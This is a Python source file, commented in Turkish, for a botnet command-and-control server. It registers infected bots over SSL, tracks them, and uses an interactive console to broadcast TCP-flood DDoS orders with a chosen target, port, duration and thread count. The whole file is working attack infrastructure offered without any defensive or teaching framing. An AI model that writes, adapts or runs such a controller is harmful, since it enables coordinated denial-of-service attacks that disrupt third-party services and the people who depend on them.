#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import threading
import json
import time
import sys
from datetime import datetime
import ssl
import hashlib

class BotnetC2:
    def __init__(self, host='0.0.0.0', port=12345):
        self.host = host
        self.port = port
        self.bots = {}
        self.bot_id_counter = 0
        self.running = True
        
    def start(self):
        # SSL context oluştur
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile='server.crt', keyfile='server.key')
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(100)
        
        print(f"[+] C2 Sunucusu {self.host}:{self.port} üzerinde çalışıyor")
        
        while self.running:
            try:
                client, addr = server.accept()
                # SSL wrapper ekle
                ssl_client = context.wrap_socket(client, server_side=True)
                bot_id = self.register_bot(ssl_client, addr)
                threading.Thread(target=self.handle_bot, args=(ssl_client, addr, bot_id)).start()
            except Exception as e:
                print(f"[-] Hata: {e}")
    
    def register_bot(self, client, addr):
        self.bot_id_counter += 1
        bot_id = hashlib.md5(f"{addr[0]}{time.time()}".encode()).hexdigest()[:8]
        self.bots[bot_id] = {
            'socket': client,
            'addr': addr,
            'connected_at': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'platform': 'unknown'
        }
        print(f"[+] Bot bağlandı: {bot_id} - {addr[0]}:{addr[1]}")
        return bot_id
    
    def handle_bot(self, client, addr, bot_id):
        try:
            while True:
                data = client.recv(4096)
                if not data:
                    break
                
                # Güncelleme
                self.bots[bot_id]['last_seen'] = datetime.now().isoformat()
                
                # Komutları işle
                if data.startswith(b"INFO:"):
                    info = json.loads(data[5:].decode())
                    self.bots[bot_id]['platform'] = info.get('platform', 'unknown')
                    client.send(b"OK")
                
                elif data.startswith(b"CMD_REQUEST"):
                    # Bot komut istiyor
                    command = self.get_command_for_bot(bot_id)
                    if command:
                        client.send(json.dumps(command).encode())
                    else:
                        client.send(b"NO_COMMAND")
                
                elif data.startswith(b"RESULT:"):
                    result = json.loads(data[7:].decode())
                    print(f"[{bot_id}] Komut sonucu: {result}")
                
        except Exception as e:
            print(f"[-] Bot {bot_id} bağlantı hatası: {e}")
        finally:
            if bot_id in self.bots:
                del self.bots[bot_id]
            client.close()
    
    def get_command_for_bot(self, bot_id):
        # Örnek DDoS komutu
        return {
            "type": "attack",
            "method": "tcp_flood",
            "target": "hedef.site.com",
            "port": 80,
            "duration": 300,
            "threads": 50
        }
    
    def broadcast_command(self, command):
        for bot_id, bot_info in self.bots.items():
            try:
                bot_info['socket'].send(json.dumps(command).encode())
            except:
                pass
    
    def show_bots(self):
        print(f"\n[+] Aktif Botlar ({len(self.bots)}):")
        for bot_id, info in self.bots.items():
            print(f"  {bot_id} - {info['addr'][0]} - {info['platform']}")

if __name__ == "__main__":
    c2 = BotnetC2()
    
    # Kontrol thread'i
    def control_thread():
        while True:
            cmd = input("\nC2> ").strip()
            if cmd == "bots":
                c2.show_bots()
            elif cmd.startswith("attack"):
                # attack target:port duration threads
                parts = cmd.split()
                if len(parts) >= 2:
                    target = parts[1]
                    port = int(parts[2]) if len(parts) > 2 else 80
                    duration = int(parts[3]) if len(parts) > 3 else 60
                    threads = int(parts[4]) if len(parts) > 4 else 10
                    
                    command = {
                        "type": "attack",
                        "method": "tcp_flood",
                        "target": target,
                        "port": port,
                        "duration": duration,
                        "threads": threads
                    }
                    c2.broadcast_command(command)
                    print(f"[+] Saldırı komutu gönderildi: {target}:{port}")
            elif cmd == "exit":
                c2.running = False
                sys.exit(0)
    
    threading.Thread(target=control_thread, daemon=True).start()
    c2.start()
